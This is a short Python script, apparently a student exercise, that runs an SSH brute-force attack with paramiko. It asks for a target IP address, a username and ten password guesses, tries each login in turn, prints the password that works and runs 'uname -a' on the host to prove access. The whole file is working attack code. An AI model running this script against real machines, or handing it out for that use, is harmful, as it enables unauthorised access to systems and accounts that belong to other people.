from datetime import datetime
import paramiko

#Required function to print details
def authInfo():
	#Define variables
	author = "Ong Lee Heung, Dominique"
	current_date = datetime.now().strftime("%d/%m/%Y")
	
	#Displays output
	print(f"Author : {author}")
	print(f"Date : {current_date}")
	print()
	
if __name__ == "__main__":
	authInfo()
	password_list = []
	target_ip = input("Enter target IP address : ")
	username = input("Enter username : ")
	print("Please enter your 10 guesses for the brute-force attack:")
	
	for i in range(10):
		password = input(f"Enter guess for password {i+1}/10 : ")
		password_list.append(password)
		
	print("Password list entered successful!")
	print(f"Passwords to test : {password_list}\n")
	print()
	print()
	print(f"Commencing brute-force attack on {target_ip} for user '{username}' ...")
	
	for password in password_list:
		try:
			#Initialise SSH client
			ssh = paramiko.SSHClient()
			ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
			
			#Attempt to connect
			ssh.connect(hostname = target_ip, username = username, password = password, timeout = 3)
			
			print(f"[+] Success! The password for '{username}' is '{password}'.")
			
			#Execute command to prove access
			stdin, stdout,stderr = ssh.exec_command("uname -a")
			print("System Info : ", stdout.read().decode())
			
			ssh.close()
			break
		except paramiko.AuthenticationException:
			print("[-] Authentication failed.")
			
		except Exception as e:
			print(f"[-] Connection error : {e}")
		finally:
			ssh.close()
